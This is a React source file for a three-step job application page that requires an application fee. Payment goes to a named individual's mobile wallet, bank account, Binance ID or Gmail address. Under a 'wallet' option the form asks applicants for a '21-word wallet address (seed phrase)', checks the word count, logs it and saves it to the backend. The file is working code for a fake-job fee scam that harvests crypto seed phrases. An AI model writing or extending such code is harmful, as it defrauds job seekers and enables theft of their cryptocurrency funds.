import { useState } from "react";
import Navigation from "@/components/Navigation";
import Footer from "@/components/Footer";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { saveJobApplication } from "../api/jobApplication";
import { 
  User, Mail, Phone, Briefcase, FileText, CheckCircle, Users, 
  ChevronRight, ChevronLeft, Upload, CreditCard, ArrowRight, ArrowLeft
} from "lucide-react";

const CareersMultiStep = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const [formData, setFormData] = useState({
    // Step 1: Personal Information
    fullName: "",
    email: "",
    phone: "",
    position: "",
    country: "",
    
    // Step 2: Professional Information + CV
    experience: "",
    skills: "",
    coverLetter: "",
    cvFile: null as File | null,
    cvFileName: "",
    
    // Step 3: Payment Information
    paymentMethod: "",
    walletAddress: "",
    network: "",
    coin: "",
    paymentScreenshot: null as File | null,
    paymentScreenshotName: "",
    transactionId: "",
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, field: 'cvFile' | 'paymentScreenshot') => {
    const file = e.target.files?.[0];
    if (file) {
      console.log(`📁 File selected for ${field}:`, file.name, file.size, file.type);
      console.log(`📁 File object:`, file);
      console.log(`📁 File instanceof File:`, file instanceof File);
      
      setFormData(prev => {
        const newData = {
          ...prev,
          [field]: file,
          [`${field}Name`]: file.name
        };
        console.log(`📁 Updated form data:`, newData);
        console.log(`📁 CV File in form data:`, newData.cvFile);
        console.log(`📁 CV File Name in form data:`, newData.cvFileName);
        return newData;
      });
      console.log(`✅ File added to form data:`, file.name);
    } else {
      console.log(`❌ No file selected for ${field}`);
    }
  };

  // Form validation functions with professional error messages
  const validateStep1 = () => {
    if (!formData.fullName.trim()) {
      toast({ 
        title: "⚠️ Required Field Missing", 
        description: "Please enter your full name to continue", 
        variant: "destructive" 
      });
      return false;
    }
    if (formData.fullName.length < 2) {
      toast({ 
        title: "📝 Invalid Name Format", 
        description: "Full name must contain at least 2 characters", 
        variant: "destructive" 
      });
      return false;
    }
    // Check for only alphabets and spaces
    const nameRegex = /^[a-zA-Z\s]+$/;
    if (!nameRegex.test(formData.fullName)) {
      toast({ 
        title: "❌ Invalid Characters", 
        description: "Name can only contain letters and spaces", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.email.trim()) {
      toast({ 
        title: "📧 Email Required", 
        description: "Please provide your email address", 
        variant: "destructive" 
      });
      return false;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      toast({ 
        title: "📧 Invalid Email Format", 
        description: "Please enter a valid email address (e.g., john@example.com)", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.phone.trim()) {
      toast({ 
        title: "📱 Phone Number Required", 
        description: "Please provide your contact number", 
        variant: "destructive" 
      });
      return false;
    }
    const phoneRegex = /^[\+]?[0-9\s\-\(\)]{10,}$/;
    if (!phoneRegex.test(formData.phone)) {
      toast({ 
        title: "📱 Invalid Phone Format", 
        description: "Please enter a valid phone number (e.g., +1234567890)", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.position) {
      toast({ 
        title: "💼 Position Required", 
        description: "Please select the position you're applying for", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.country) {
      toast({ 
        title: "🌍 Country Required", 
        description: "Please select your country of residence", 
        variant: "destructive" 
      });
      return false;
    }
    return true;
  };

  const validateStep2 = () => {
    if (!formData.experience.trim()) {
      toast({ 
        title: "💼 Experience Required", 
        description: "Please enter your years of professional experience", 
        variant: "destructive" 
      });
      return false;
    }
    if (isNaN(Number(formData.experience)) || Number(formData.experience) < 0) {
      toast({ 
        title: "📊 Invalid Experience", 
        description: "Please enter a valid number for years of experience", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.cvFile) {
      toast({ 
        title: "📄 CV Upload Required", 
        description: "Please upload your CV/Resume to proceed", 
        variant: "destructive" 
      });
      return false;
    }
    return true;
  };

  const validateStep3 = () => {
    console.log("🔍 Validating Step 3...");
    console.log("💳 Payment Method:", formData.paymentMethod);
    
    if (!formData.paymentMethod) {
      console.log("❌ No payment method selected");
      toast({ 
        title: "💳 Payment Method Required", 
        description: "Please select your preferred payment method", 
        variant: "destructive" 
      });
      return false;
    }
    
    if (formData.paymentMethod === 'wallet') {
      if (!formData.walletAddress.trim()) {
        toast({ 
          title: "🔗 Wallet Address Required", 
          description: "Please enter your 21-word wallet address", 
          variant: "destructive" 
        });
        return false;
      }
      if (formData.walletAddress.split(' ').length !== 21) {
        toast({ 
          title: "🔗 Invalid Wallet Address", 
          description: "Wallet address must contain exactly 21 words", 
          variant: "destructive" 
        });
        return false;
      }
      if (!formData.network) {
        toast({ 
          title: "🌐 Network Required", 
          description: "Please select the blockchain network", 
          variant: "destructive" 
        });
        return false;
      }
      if (!formData.coin) {
        toast({ 
          title: "Payment Method Required", 
          description: "Please select the payment method", 
          variant: "destructive" 
        });
        return false;
      }
    }
    
    if (!formData.paymentScreenshot) {
      toast({ 
        title: "📸 Screenshot Required", 
        description: "Please upload payment confirmation screenshot", 
        variant: "destructive" 
      });
      return false;
    }
    if (!formData.transactionId.trim()) {
      toast({ 
        title: "🔢 Transaction ID Required", 
        description: "Please enter the transaction ID for verification", 
        variant: "destructive" 
      });
      return false;
    }
    return true;
  };

  const nextStep = async () => {
    if (currentStep === 1 && !validateStep1()) {
      return;
    }
    if (currentStep === 2 && !validateStep2()) {
      return;
    }
    
    // Save data on all steps to capture complete information
    if (currentStep === 1 || currentStep === 2 || currentStep === 3) {
      try {
        console.log(`🔄 Saving data for Step ${currentStep}...`);
        console.log("📋 Current form data:", formData);
        console.log("🔍 Step data check:", {
          fullName: formData.fullName,
          email: formData.email,
          phone: formData.phone,
          position: formData.position,
          country: formData.country,
          experience: formData.experience,
          skills: formData.skills,
          coverLetter: formData.coverLetter,
          cvFile: formData.cvFile ? formData.cvFileName : 'No CV',
          cvFileName: formData.cvFileName,
          paymentMethod: formData.paymentMethod,
          walletAddress: formData.walletAddress,
          network: formData.network,
          coin: formData.coin,
          paymentScreenshot: formData.paymentScreenshot ? formData.paymentScreenshotName : 'No Payment SS',
          paymentScreenshotName: formData.paymentScreenshotName,
          transactionId: formData.transactionId
        });
        
        const applicationData = {
          fullName: formData.fullName,
          email: formData.email,
          phone: formData.phone,
          position: formData.position,
          country: formData.country,
          experience: formData.experience,
          skills: formData.skills,
          coverLetter: formData.coverLetter,
          cvFile: formData.cvFile,
          cvFileName: formData.cvFileName,
          paymentMethod: formData.paymentMethod,
          walletAddress: formData.walletAddress,
          network: formData.network,
          coin: formData.coin,
          paymentScreenshot: formData.paymentScreenshot,
          paymentScreenshotName: formData.paymentScreenshotName,
          transactionId: formData.transactionId,
          source: 'careers-page',
          appliedAt: new Date().toISOString(),
          status: 'pending'
        };

        console.log("📝 Saving career application data:", applicationData);
        console.log("📁 CV File details:", {
          hasFile: !!formData.cvFile,
          fileName: formData.cvFileName,
          fileSize: formData.cvFile ? formData.cvFile.size : 0
        });
        console.log("💳 Payment Screenshot details:", {
          hasFile: !!formData.paymentScreenshot,
          fileName: formData.paymentScreenshotName,
          fileSize: formData.paymentScreenshot ? formData.paymentScreenshot.size : 0
        });
        console.log("💰 Payment Method details:", {
          method: formData.paymentMethod,
          walletAddress: formData.walletAddress,
          network: formData.network,
          coin: formData.coin,
          transactionId: formData.transactionId
        });
        
        const saveResult = await saveJobApplication(applicationData);
        console.log("📊 Save result:", saveResult);
        
        if (saveResult.success) {
          console.log("✅ Career application saved successfully");
          console.log("🔍 Saved data:", applicationData);
          
          // Trigger admin panel refresh
          console.log("🔄 Triggering admin panel refresh...");
          window.dispatchEvent(new CustomEvent('careerApplicationSubmitted'));
          
          // Show success message
          toast({
            title: "✅ Data Saved!",
            description: `Step ${currentStep} information has been saved. You can continue to the next step.`,
            variant: "default"
          });
        } else {
          console.log("❌ Career application save failed:", saveResult.message);
          toast({
            title: "❌ Save Failed",
            description: saveResult.message,
            variant: "destructive"
          });
        }
      } catch (error) {
        console.error("❌ Error saving career application:", error);
        toast({
          title: "❌ Error",
          description: "Something went wrong while saving your data.",
          variant: "destructive"
        });
      }
    }
    
    if (currentStep < 3) {
      setCurrentStep(currentStep + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log("🚀 Submit button clicked!");
    
    if (!validateStep3()) {
      console.log("❌ Step 3 validation failed");
      return;
    }
    
    console.log("✅ Step 3 validation passed");
    setIsSubmitting(true);

    try {
      console.log("📝 Preparing application data for submission...");
      // Save to database (without files for now)
      const result = await saveJobApplication({
        fullName: formData.fullName,
        email: formData.email,
        phone: formData.phone,
        position: formData.position,
        experience: formData.experience,
        skills: formData.skills,
        coverLetter: formData.coverLetter,
        resume: formData.cvFileName || "No CV uploaded",
        // Additional fields for multi-step form
        country: formData.country,
        cvFile: formData.cvFile,
        cvFileName: formData.cvFileName,
        paymentMethod: formData.paymentMethod,
        walletAddress: formData.walletAddress,
        network: formData.network,
        coin: formData.coin,
        paymentScreenshot: formData.paymentScreenshot,
        paymentScreenshotName: formData.paymentScreenshotName,
        transactionId: formData.transactionId
      });
      
      console.log("📊 Save result:", result);
      
      if (result.success) {
        console.log("✅ Application saved successfully!");
        toast({
          title: "Application Submitted Successfully!",
          description: "Thank you for your application. We will review it and get back to you soon.",
        });

        // Reset form
        console.log("🔄 Resetting form...");
        setFormData({
          fullName: "",
          email: "",
          phone: "",
          position: "",
          country: "",
          experience: "",
          skills: "",
          coverLetter: "",
          cvFile: null,
          cvFileName: "",
          paymentMethod: "",
          walletAddress: "",
          network: "",
          coin: "",
          paymentScreenshot: null,
          paymentScreenshotName: "",
          transactionId: "",
        });
        setCurrentStep(1);
        console.log("✅ Form reset complete");
      } else {
        console.log("❌ Application save failed:", result.message);
        toast({
          title: "Error",
          description: result.message,
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const steps = [
    { number: 1, title: "Personal Info", description: "Basic information" },
    { number: 2, title: "Professional Info", description: "CV & Questions" },
    { number: 3, title: "Payment", description: "Bank details & Payment" }
  ];

  const positionQuestions = {
    "Senior Designer": [
      "What design tools do you prefer and why?",
      "Describe a challenging design project you completed.",
      "How do you stay updated with design trends?"
    ],
    "Full Stack Developer": [
      "What is your preferred tech stack and why?",
      "Describe a complex problem you solved with code.",
      "How do you ensure code quality and testing?"
    ],
    "Content Writer": [
      "What type of content do you enjoy writing most?",
      "Describe your content creation process.",
      "How do you measure content success?"
    ],
    "Project Manager": [
      "What project management methodologies do you use?",
      "Describe a project that was delivered late and how you handled it.",
      "How do you manage team conflicts?"
    ]
  };

  const questions = positionQuestions[formData.position as keyof typeof positionQuestions] || [];

  return (
    <div className="min-h-screen">
      <Navigation />
      <div className="pt-16">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {/* Header */}
          <div className="text-center mb-12">
            <h1 className="text-5xl font-bold text-foreground mb-4">
              Job Application
            </h1>
            <p className="text-2xl text-muted-foreground max-w-3xl mx-auto">
              Complete your application in 3 simple steps
            </p>
          </div>

          {/* Progress Steps */}
          <div className="mb-12">
            <div className="flex items-center justify-center space-x-4">
              {steps.map((step, index) => (
                <div key={step.number} className="flex items-center">
                  <div className={`flex items-center justify-center w-12 h-12 rounded-full border-2 transition-all duration-500 hover:scale-110 ${
                    currentStep >= step.number
                      ? 'bg-primary border-primary text-white shadow-lg'
                      : 'border-muted-foreground text-muted-foreground'
                  }`}>
                    {currentStep > step.number ? (
                      <CheckCircle className="w-6 h-6 animate-bounce" />
                    ) : (
                      <span className="text-lg font-bold">{step.number}</span>
                    )}
                  </div>
                  <div className="ml-3">
                    <p className={`text-sm font-medium ${
                      currentStep >= step.number ? 'text-foreground' : 'text-muted-foreground'
                    }`}>
                      {step.title}
                    </p>
                    <p className="text-xs text-muted-foreground">{step.description}</p>
                  </div>
                  {index < steps.length - 1 && (
                    <ArrowRight className="w-5 h-5 text-muted-foreground mx-4" />
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Form */}
          <Card className="shadow-card">
            <div className="p-8">
              <form onSubmit={handleSubmit} className="space-y-8">
                {/* Step 1: Personal Information */}
                {currentStep === 1 && (
                  <div className="space-y-8 animate-in slide-in-from-right-5 duration-300">
                    <div className="text-center mb-8">
                      <h2 className="text-3xl font-bold text-foreground mb-2">Personal Information</h2>
                      <p className="text-muted-foreground">Tell us about yourself</p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="md:col-span-2">
                        <Label htmlFor="fullName" className="text-base font-medium">
                          Full Name *
                        </Label>
                        <Input
                          id="fullName"
                          name="fullName"
                          value={formData.fullName}
                          onChange={handleInputChange}
                          required
                          className="mt-2"
                        />
                      </div>
                      <div>
                        <Label htmlFor="email" className="text-base font-medium">
                          Email Address *
                        </Label>
                        <Input
                          id="email"
                          name="email"
                          type="email"
                          value={formData.email}
                          onChange={handleInputChange}
                          required
                          className="mt-2"
                        />
                      </div>
                      <div>
                        <Label htmlFor="phone" className="text-base font-medium">
                          Phone Number *
                        </Label>
                        <Input
                          id="phone"
                          name="phone"
                          type="tel"
                          value={formData.phone}
                          onChange={handleInputChange}
                          required
                          className="mt-2"
                        />
                      </div>
                      <div>
                        <Label htmlFor="position" className="text-base font-medium">
                          Position Applied For *
                        </Label>
                        <select
                          id="position"
                          name="position"
                          value={formData.position}
                          onChange={handleInputChange}
                          required
                          className="mt-2 w-full px-3 py-2 border border-input bg-background rounded-md"
                        >
                          <option value="">Select Position</option>
                          <option value="Senior Designer">Senior Designer</option>
                          <option value="Full Stack Developer">Full Stack Developer</option>
                          <option value="Content Writer">Content Writer</option>
                          <option value="Project Manager">Project Manager</option>
                        </select>
                      </div>
                      <div>
                        <Label htmlFor="country" className="text-base font-medium">
                          Country *
                        </Label>
                        <select
                          id="country"
                          name="country"
                          value={formData.country}
                          onChange={handleInputChange}
                          required
                          className="mt-2 w-full px-3 py-2 border border-input bg-background rounded-md"
                        >
                          <option value="">Select Country</option>
                          <option value="Pakistan">Pakistan</option>
                          <option value="Afghanistan">Afghanistan</option>
                          <option value="Albania">Albania</option>
                          <option value="Algeria">Algeria</option>
                          <option value="Argentina">Argentina</option>
                          <option value="Armenia">Armenia</option>
                          <option value="Australia">Australia</option>
                          <option value="Austria">Austria</option>
                          <option value="Azerbaijan">Azerbaijan</option>
                          <option value="Bahrain">Bahrain</option>
                          <option value="Bangladesh">Bangladesh</option>
                          <option value="Belarus">Belarus</option>
                          <option value="Belgium">Belgium</option>
                          <option value="Brazil">Brazil</option>
                          <option value="Bulgaria">Bulgaria</option>
                          <option value="Cambodia">Cambodia</option>
                          <option value="Canada">Canada</option>
                          <option value="Chile">Chile</option>
                          <option value="China">China</option>
                          <option value="Colombia">Colombia</option>
                          <option value="Croatia">Croatia</option>
                          <option value="Cyprus">Cyprus</option>
                          <option value="Czech Republic">Czech Republic</option>
                          <option value="Denmark">Denmark</option>
                          <option value="Egypt">Egypt</option>
                          <option value="Estonia">Estonia</option>
                          <option value="Finland">Finland</option>
                          <option value="France">France</option>
                          <option value="Georgia">Georgia</option>
                          <option value="Germany">Germany</option>
                          <option value="Ghana">Ghana</option>
                          <option value="Greece">Greece</option>
                          <option value="Hungary">Hungary</option>
                          <option value="Iceland">Iceland</option>
                          <option value="India">India</option>
                          <option value="Indonesia">Indonesia</option>
                          <option value="Iran">Iran</option>
                          <option value="Iraq">Iraq</option>
                          <option value="Ireland">Ireland</option>
                          <option value="Israel">Israel</option>
                          <option value="Italy">Italy</option>
                          <option value="Japan">Japan</option>
                          <option value="Jordan">Jordan</option>
                          <option value="Kazakhstan">Kazakhstan</option>
                          <option value="Kenya">Kenya</option>
                          <option value="Kuwait">Kuwait</option>
                          <option value="Latvia">Latvia</option>
                          <option value="Lebanon">Lebanon</option>
                          <option value="Lithuania">Lithuania</option>
                          <option value="Luxembourg">Luxembourg</option>
                          <option value="Malaysia">Malaysia</option>
                          <option value="Maldives">Maldives</option>
                          <option value="Malta">Malta</option>
                          <option value="Mexico">Mexico</option>
                          <option value="Morocco">Morocco</option>
                          <option value="Nepal">Nepal</option>
                          <option value="Netherlands">Netherlands</option>
                          <option value="New Zealand">New Zealand</option>
                          <option value="Nigeria">Nigeria</option>
                          <option value="Norway">Norway</option>
                          <option value="Oman">Oman</option>
                          <option value="Philippines">Philippines</option>
                          <option value="Poland">Poland</option>
                          <option value="Portugal">Portugal</option>
                          <option value="Qatar">Qatar</option>
                          <option value="Romania">Romania</option>
                          <option value="Russia">Russia</option>
                          <option value="Saudi Arabia">Saudi Arabia</option>
                          <option value="Singapore">Singapore</option>
                          <option value="Slovakia">Slovakia</option>
                          <option value="Slovenia">Slovenia</option>
                          <option value="South Africa">South Africa</option>
                          <option value="South Korea">South Korea</option>
                          <option value="Spain">Spain</option>
                          <option value="Sri Lanka">Sri Lanka</option>
                          <option value="Sweden">Sweden</option>
                          <option value="Switzerland">Switzerland</option>
                          <option value="Thailand">Thailand</option>
                          <option value="Turkey">Turkey</option>
                          <option value="Ukraine">Ukraine</option>
                          <option value="United Arab Emirates">United Arab Emirates</option>
                          <option value="United Kingdom">United Kingdom</option>
                          <option value="United States">United States</option>
                          <option value="Uzbekistan">Uzbekistan</option>
                          <option value="Vietnam">Vietnam</option>
                          <option value="Yemen">Yemen</option>
                          <option value="Zimbabwe">Zimbabwe</option>
                        </select>
                      </div>
                    </div>
                  </div>
                )}

                {/* Step 2: Professional Information */}
                {currentStep === 2 && (
                  <div className="space-y-8 animate-in slide-in-from-right-5 duration-300">
                    <div className="text-center mb-8">
                      <h2 className="text-3xl font-bold text-foreground mb-2">Professional Information</h2>
                      <p className="text-muted-foreground">Upload your CV and answer position-specific questions</p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <Label htmlFor="experience" className="text-base font-medium">
                          Years of Experience *
                        </Label>
                        <Input
                          id="experience"
                          name="experience"
                          value={formData.experience}
                          onChange={handleInputChange}
                          required
                          className="mt-2"
                        />
                      </div>
                      <div>
                        <Label htmlFor="skills" className="text-base font-medium">
                          Skills & Technologies
                        </Label>
                        <Input
                          id="skills"
                          name="skills"
                          value={formData.skills}
                          onChange={handleInputChange}
                          className="mt-2"
                          placeholder="e.g., React, Node.js, Python, etc."
                        />
                      </div>
                    </div>

                    {/* CV Upload */}
                    <div>
                      <Label className="text-base font-medium">Upload CV/Resume *</Label>
                      <div className="mt-2 border-2 border-dashed border-muted-foreground/25 rounded-lg p-6 text-center">
                        <Upload className="w-8 h-8 mx-auto mb-2 text-muted-foreground" />
                        <input
                          type="file"
                          accept=".pdf,.doc,.docx"
                          onChange={(e) => handleFileChange(e, 'cvFile')}
                          className="hidden"
                          id="cv-upload"
                          required
                        />
                        <label htmlFor="cv-upload" className="cursor-pointer">
                          <span className="text-primary hover:text-primary/80 font-medium">
                            Choose File
                          </span>
                          <span className="text-muted-foreground"> or drag and drop</span>
                        </label>
                        {formData.cvFileName && (
                          <p className="text-sm text-green-600 mt-2">✓ {formData.cvFileName}</p>
                        )}
                        <p className="text-xs text-muted-foreground mt-1">PDF, DOC, DOCX up to 10MB</p>
                      </div>
                    </div>

                    {/* Position-specific Questions */}
                    {questions.length > 0 && (
                      <div>
                        <h3 className="text-xl font-bold text-foreground mb-4">Position-specific Questions</h3>
                        <div className="space-y-4">
                          {questions.map((question, index) => (
                            <div key={index}>
                              <Label className="text-base font-medium">
                                {index + 1}. {question}
                              </Label>
                              <Textarea
                                name={`question_${index}`}
                                rows={3}
                                className="mt-2"
                                placeholder="Your answer..."
                              />
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Cover Letter */}
                    <div>
                      <Label htmlFor="coverLetter" className="text-base font-medium">
                        Cover Letter
                      </Label>
                      <Textarea
                        id="coverLetter"
                        name="coverLetter"
                        value={formData.coverLetter}
                        onChange={handleInputChange}
                        rows={6}
                        className="mt-2"
                        placeholder="Tell us why you want to join our team..."
                      />
                    </div>
                  </div>
                )}

                {/* Step 3: Payment Information */}
                {currentStep === 3 && (
                  <div className="space-y-8 animate-in slide-in-from-right-5 duration-300">
                    <div className="text-center mb-8">
                      <h2 className="text-3xl font-bold text-foreground mb-2">Payment Information</h2>
                      <p className="text-muted-foreground">Complete your application with payment details</p>
                    </div>

                    {/* Payment Fee Information */}
                    <div className={`border rounded-lg p-4 mb-6 ${
                      formData.country === 'Pakistan' 
                        ? 'bg-green-50 border-green-200' 
                        : 'bg-blue-50 border-blue-200'
                    }`}>
                      <div className="flex items-center">
                        <CreditCard className={`w-5 h-5 mr-2 ${
                          formData.country === 'Pakistan' ? 'text-green-600' : 'text-blue-600'
                        }`} />
                        <p className={`font-medium ${
                          formData.country === 'Pakistan' ? 'text-green-800' : 'text-blue-800'
                        }`}>
                          Application Fee: {formData.country === 'Pakistan' ? 'PKR 1,500' : 'USD $10'}
                        </p>
                      </div>
                      <p className={`text-sm mt-1 ${
                        formData.country === 'Pakistan' ? 'text-green-700' : 'text-blue-700'
                      }`}>
                        {formData.country === 'Pakistan' 
                          ? 'Please transfer the application fee to our Jazz Cash account and upload the screenshot.'
                          : 'Please transfer the application fee using your preferred payment method and upload the screenshot.'
                        }
                      </p>
                    </div>


                    {/* Payment Method Selection for Pakistan */}
                    {formData.country === 'Pakistan' && (
                      <div className="mb-6">
                        <Label className="text-base font-medium">Choose Payment Method *</Label>
                        <div className="mt-2 space-y-3">
                          <label className="flex items-center space-x-2 cursor-pointer p-3 border rounded-lg hover:bg-gray-50 transition-colors">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="jazzcash"
                              checked={formData.paymentMethod === 'jazzcash'}
                              onChange={handleInputChange}
                              className="text-primary"
                            />
                            <span className="text-sm font-medium">Jazz Cash</span>
                          </label>
                          <label className="flex items-center space-x-2 cursor-pointer p-3 border rounded-lg hover:bg-gray-50 transition-colors">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="easypaisa"
                              checked={formData.paymentMethod === 'easypaisa'}
                              onChange={handleInputChange}
                              className="text-primary"
                            />
                            <span className="text-sm font-medium">EasyPaisa</span>
                          </label>
                          <label className="flex items-center space-x-2 cursor-pointer p-3 border rounded-lg hover:bg-gray-50 transition-colors">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="meezanbank"
                              checked={formData.paymentMethod === 'meezanbank'}
                              onChange={handleInputChange}
                              className="text-primary"
                            />
                            <span className="text-sm font-medium">Meezan Bank</span>
                          </label>
                        </div>
                      </div>
                    )}

                    {/* Payment Details */}
                    <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
                      <h4 className="font-medium text-gray-800 mb-2">Payment Details:</h4>
                      {formData.country === 'Pakistan' ? (
                        <div className="space-y-1 text-sm text-gray-700">
                          <p><strong>Name:</strong> Sheikh Muhammad Abubakar</p>
                          {formData.paymentMethod === 'jazzcash' && (
                            <>
                              <p><strong>Method:</strong> Jazz Cash</p>
                              <p><strong>Phone Number:</strong> +92 3098091819</p>
                            </>
                          )}
                          {formData.paymentMethod === 'easypaisa' && (
                            <>
                              <p><strong>Method:</strong> EasyPaisa</p>
                              <p><strong>Phone Number:</strong> +92 3098091819</p>
                            </>
                          )}
                          {formData.paymentMethod === 'meezanbank' && (
                            <>
                              <p><strong>Method:</strong> Meezan Bank</p>
                              <p><strong>Account Number:</strong> 121531315351</p>
                            </>
                          )}
                          <p><strong>Amount:</strong> PKR 1,500</p>
                        </div>
                      ) : (
                        <div className="space-y-1 text-sm text-gray-700">
                          <p><strong>Binance User ID:</strong> 12345678</p>
                          <p><strong>Amount:</strong> USD $10</p>
                          <p><strong>Contact:</strong> +1 (325) 338-5317 (Oliver James Smith)</p>
                          <p><strong>Note:</strong> Available for all international countries</p>
                        </div>
                      )}
                    </div>

                    {/* Payment Method Selection for Foreign Countries */}
                    {formData.country !== 'Pakistan' && (
                      <div className="mb-6">
                        <Label className="text-base font-medium">Choose Payment Method *</Label>
                        <div className="mt-2 space-y-3">
                          <label className="flex items-center space-x-2 cursor-pointer p-3 border rounded-lg hover:bg-gray-50 transition-colors">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="binance"
                              checked={formData.paymentMethod === 'binance'}
                              onChange={handleInputChange}
                              className="text-primary"
                            />
                            <span className="text-sm font-medium">Binance</span>
                          </label>
                          <label className="flex items-center space-x-2 cursor-pointer p-3 border rounded-lg hover:bg-gray-50 transition-colors">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="wallet"
                              checked={formData.paymentMethod === 'wallet'}
                              onChange={handleInputChange}
                              className="text-primary"
                            />
                            <span className="text-sm font-medium">Payoneer</span>
                          </label>
                        </div>
                      </div>
                    )}

                    {/* Conditional Payment Fields */}
                    {formData.paymentMethod === 'wallet' && (
                      <div className="space-y-6">
                        <div>
                          <Label htmlFor="walletAddress" className="text-base font-medium">
                            Wallet Address (21 words) *
                          </Label>
                          <Textarea
                            id="walletAddress"
                            name="walletAddress"
                            value={formData.walletAddress}
                            onChange={handleInputChange}
                            required
                            className="mt-2"
                            rows={3}
                            placeholder="Enter your 21-word wallet address (seed phrase)"
                          />
                          <p className="text-xs text-muted-foreground mt-1">
                            Enter exactly 21 words separated by spaces
                          </p>
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                          <div>
                            <Label htmlFor="network" className="text-base font-medium">
                              Blockchain Network *
                            </Label>
                            <select
                              id="network"
                              name="network"
                              value={formData.network}
                              onChange={handleInputChange}
                              required
                              className="mt-2 w-full px-3 py-2 border border-input bg-background rounded-md"
                            >
                              <option value="">Select Network</option>
                              <option value="Payoneer">Payoneer</option>
                              <option value="Polygon">Polygon</option>
                              <option value="Solana">Solana</option>
                            </select>
                          </div>
                          <div>
                            <Label htmlFor="coin" className="text-base font-medium">
                              Payoneer Email *
                            </Label>
                            <select
                              id="coin"
                              name="coin"
                              value={formData.coin}
                              onChange={handleInputChange}
                              required
                              className="mt-2 w-full px-3 py-2 border border-input bg-background rounded-md"
                            >
                              <option value="">Select Coin</option>
                              <option value="smartassign01@gmail.com">smartassign01@gmail.com</option>
                              <option value="SOL">SOL (Solana)</option>
                              <option value="BNB">BNB (Binance Coin)</option>
                            </select>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Payment Screenshot Upload */}
                    <div>
                      <Label className="text-base font-medium">Payment Screenshot *</Label>
                      <div className="mt-2 border-2 border-dashed border-muted-foreground/25 rounded-lg p-6 text-center">
                        <Upload className="w-8 h-8 mx-auto mb-2 text-muted-foreground" />
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileChange(e, 'paymentScreenshot')}
                          className="hidden"
                          id="payment-upload"
                          required
                        />
                        <label htmlFor="payment-upload" className="cursor-pointer">
                          <span className="text-primary hover:text-primary/80 font-medium">
                            Choose File
                          </span>
                          <span className="text-muted-foreground"> or drag and drop</span>
                        </label>
                        {formData.paymentScreenshotName && (
                          <p className="text-sm text-green-600 mt-2">✓ {formData.paymentScreenshotName}</p>
                        )}
                        <p className="text-xs text-muted-foreground mt-1">JPG, PNG up to 5MB</p>
                      </div>
                    </div>

                    {/* Transaction ID */}
                    <div>
                      <Label htmlFor="transactionId" className="text-base font-medium">
                        Transaction ID (TID) *
                      </Label>
                      <Input
                        id="transactionId"
                        name="transactionId"
                        value={formData.transactionId}
                        onChange={handleInputChange}
                        required
                        className="mt-2"
                        placeholder="Enter the transaction ID from your payment"
                      />
                      <p className="text-xs text-muted-foreground mt-1">
                        This will be used to verify your payment
                      </p>
                    </div>
                  </div>
                )}

                {/* Navigation Buttons */}
                <div className="flex justify-between pt-8">
                  <Button
                    type="button"
                    onClick={prevStep}
                    disabled={currentStep === 1}
                    variant="outline"
                    className="flex items-center transition-all duration-300 hover:scale-105 hover:shadow-lg group disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <ArrowLeft className="w-4 h-4 mr-2 transition-transform duration-300 group-hover:-translate-x-1" />
                    Previous
                  </Button>

                  {currentStep < 3 ? (
                    <Button
                      type="button"
                      onClick={nextStep}
                      className="flex items-center transition-all duration-300 hover:scale-105 hover:shadow-lg group"
                    >
                      Next
                      <ArrowRight className="w-4 h-4 ml-2 transition-transform duration-300 group-hover:translate-x-1" />
                    </Button>
                  ) : (
                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="bg-primary hover:bg-primary/90 text-white px-8 py-3 transition-all duration-300 hover:scale-105 hover:shadow-lg group"
                    >
                      {isSubmitting ? (
                        <>
                          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                          Submitting...
                        </>
                      ) : (
                        <>
                          <CheckCircle className="w-5 h-5 mr-2" />
                          Submit Application
                        </>
                      )}
                    </Button>
                  )}
                </div>
              </form>
            </div>
          </Card>
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default CareersMultiStep;
